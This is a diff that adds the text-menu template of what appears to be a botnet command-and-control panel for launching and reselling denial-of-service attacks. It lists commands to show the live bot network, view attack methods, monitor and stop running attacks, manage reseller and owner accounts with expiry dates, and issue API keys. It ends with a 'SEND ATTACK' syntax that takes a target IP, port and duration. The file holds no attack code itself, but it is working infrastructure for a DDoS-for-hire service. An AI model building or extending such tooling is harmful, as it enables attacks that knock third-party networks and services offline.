@@ -1,0 +1,23 @@
+{$clear}
+{$resize.80w.24h}<Bluelagoo>  ██████████████████████████████████████████████████████████████████████████
+          <white>USER<Mango>  {$user.username}      <white>ROLE<Purple Love>  {$user.role}      <white>EXPIRY<Ibtesam>  {$user.expiry}
+<Bluelagoo>  ██████████████████████████████████████████████████████████████████████████
+<white>
+<Bluelagoo>  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  <Mango>COMMAND                             ┃  <Mango>DESCRIPTION
+<Bluelagoo>  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  <Skyline>bots<white>  /  <Skyline>list<white>                       ┃  <white>Live bot network display
+  <Skyline>methods<white>                             ┃  <white>View all available attack methods
+  <Skyline>ongoing<white>                             ┃  <white>Live running attack monitor
+  <Skyline>lookup<white> <Ibtesam><ip / url><white>                   ┃  <white>IP geo and network lookup
+  <Skyline>info<white>                                ┃  <white>Server and protocol info
+  <Skyline>count<white>  ·  <Skyline>stop<white>                      ┃  <white>Bot count  /  halt all attacks
+  <Skyline>admin<white>                               ┃  <white>User management panel  <Mango>(reseller+)
+  <Skyline>adduser<white> <Ibtesam><user> <pass> [role] [days]<white> ┃  <white>Create a user  <Mango>(reseller+)
+  <Skyline>deluser<white> <Ibtesam><user><white>                      ┃  <white>Delete a user  <Purple Love>(owner)
+  <Skyline>setrole<white>  <Skyline>setlimits<white>  <Skyline>setexpiry<white>       ┃  <white>Role / limits / expiry  <Purple Love>(owner)
+  <Skyline>apikey<white> <Ibtesam>gen<white> | <Ibtesam>show<white> | <Ibtesam>revoke<white>          ┃  <white>API key management  <Purple Love>(owner)
+  <Skyline>clear<white>  ·  <Skyline>banner<white>  ·  <Skyline>exit<white>           ┃  <white>Navigation
+<Bluelagoo>  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  <white>⚡  <Ibtesam>SEND ATTACK<white>  →  <Mango>.<method>  <Ibtesam><ip>  <Ibtesam><port>  <Ibtesam><seconds>
+<Bluelagoo>  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
